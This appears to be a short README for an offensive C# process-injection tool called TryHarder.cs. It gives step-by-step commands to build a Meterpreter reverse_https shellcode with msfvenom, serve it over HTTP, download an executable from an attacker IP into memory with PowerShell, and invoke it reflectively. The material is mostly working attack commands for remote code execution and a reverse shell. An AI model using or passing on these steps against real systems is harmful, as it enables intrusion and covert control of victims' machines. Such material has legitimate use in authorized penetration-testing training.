## TryHarder.cs

Another Process Injection technique that loads the shellcode remotely, thanks to [saulgoodman](https://github.com/saulg00dmin) for pointing out this technique.<br>

1. Create Shellcode using msfvenom:<br>
- `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw EXITFUNC=thread -o shellcode.bin`

2. Serve the `shellcode.bin` with python server: `python3 -m http.server 80`

3. Convert the EXE into a byte array:<br>
- `$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.190/Tryharder.exe')`

4. Load the EXE into memory:<br>
- `$assem = [System.Reflection.Assembly]::Load($data)`

5. Invoke its entry point:
- `$assem.EntryPoint.Invoke($null, @([string[]]@()))`
